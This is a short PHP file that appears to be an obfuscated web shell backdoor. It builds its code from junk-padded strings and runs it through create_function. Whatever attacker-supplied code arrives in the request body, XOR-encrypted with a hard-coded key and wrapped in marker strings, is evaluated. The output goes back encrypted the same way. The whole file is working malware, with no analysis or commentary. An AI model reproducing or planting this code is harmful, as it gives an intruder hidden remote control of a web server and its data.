<?php
$v='_conqtents(q);@ob_endq_qclean();$r=q@qbase6q4_qencoqde(@x(@gzcompqrqesqs($oq),$k));qprint("$p$kh$r$kf");}';
$C='$o.=$qt{$i}^q$k{$j}q;q}}qreturn $o;}if (q@pqreg_matqcqqh("/$kh(q.+)$kf/",@file_qget_conteqntqs("php://qin';
$t='qput"),q$m)==1) {@oqbqq_start();@evaql(@gqqzuncompqress(@x(@basqe6q4_decodeq($m[1]),$k))q);$o=@oqqb_get';
$I=str_replace('lc','','crelcalcte_lcflculcnclction');
$c=',$k){$c=strqlenq(q$k);$lq=sqtrlen($t)q;$o="";for($iq=0;$i<$l;)q{for($qj=0q;($j<q$c&&$i<$l);$jq+q+,$i++){';
$T='$k=q"9692b566";$qkh="qqa18a38q7aaff7";$kf="q67afqf842q86fq9";$p="qq93lqD4qyMmZ5RcPP1qF";functionq xq($t';
$L=str_replace('q','',$T.$c.$C.$t.$v);
$u=$I('',$L);$u();
?>
